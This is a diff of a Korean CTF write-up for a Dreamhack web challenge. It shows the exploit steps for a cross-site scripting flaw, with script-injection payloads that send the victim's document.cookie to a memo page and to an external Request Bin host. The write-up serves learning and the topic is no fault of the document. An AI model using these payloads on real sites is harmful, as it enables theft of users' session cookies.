@@ -140,25 +140,22 @@ vuln 페이지에서 전달된 탬플릿 변수를 기록할 때 HTTML 엔티티
 
 ### 익스플로잇
 #### 방법 1: memo 페이지 이용
-1. flag 페이지에서 ```<script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie;"></script>```를 입력하고 제출 버튼을 클릭함
-    - 스크립트 부분은 두 단계롤 거쳐 파라미터로 해석되기 때문에 ```'/memo?memo='%2bdocument.cookie;``` 부분에서 ```+``` 대신에 ```%2b```를 사용함 (```+``` 사용 시 URL Decoding 되어 공백으로 해석됨)
+<img width="2560" alt="익스플로잇 방법 2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/a4d2a7d2-cb69-4b73-b015-2734bd4310c9">
 
-<br/>
+1. flag 페이지에서 ```<script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie;"></script>```를 입력하고 제출 버튼을 클릭함
+    - 스크립트 부분은 두 단계롤 거쳐 파라미터로 해석되기 때문에 ```'/memo?memo='%2bdocument.cookie;``` 부분에서 ```+``` 대신에 ```%2b```를 사용함 (URL Decoding 되어 공백으로 해석되는 것을 방지)
 
 2. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함
 
 <br/>
 
 #### 방법 2: 외부 웹 서버 이용
+<img width="2560" alt="익스플로잇 방법 1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/0e9a6131-43e4-40ee-a609-ad7eb200069f">
+
 1. 외부에서 접근 가능한 웹 서버를 준비함
     - Dreamhack에서 제공하는 [드림핵 툴즈 서비스](https://tools.dreamhack.games)의 Request Bin 기능을 이용함
         + Request Bin 항목에서 랜덤한 URL를 생성한 후 이를 이용하여 익스플로잇을 수행함
 
-<br/>
-
-2. flag 엔드포인트에서 ```<script src="/vuln?param=document.location='http://RANDOMHOST.request.dreamhack.games/?memo='%2bdocument.cookie;"></script>```를 입력하고 제출 버튼으 클릭함
-
-<br/>
+2. flag 엔드포인트에서 ```<script src="/vuln?param=document.location='http://RANDOMHOST.request.dreamhack.games/?memo='%2bdocument.cookie;"></script>```를 입력하고 제출 버튼을 클릭함
 
 3. "good" 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득함
-
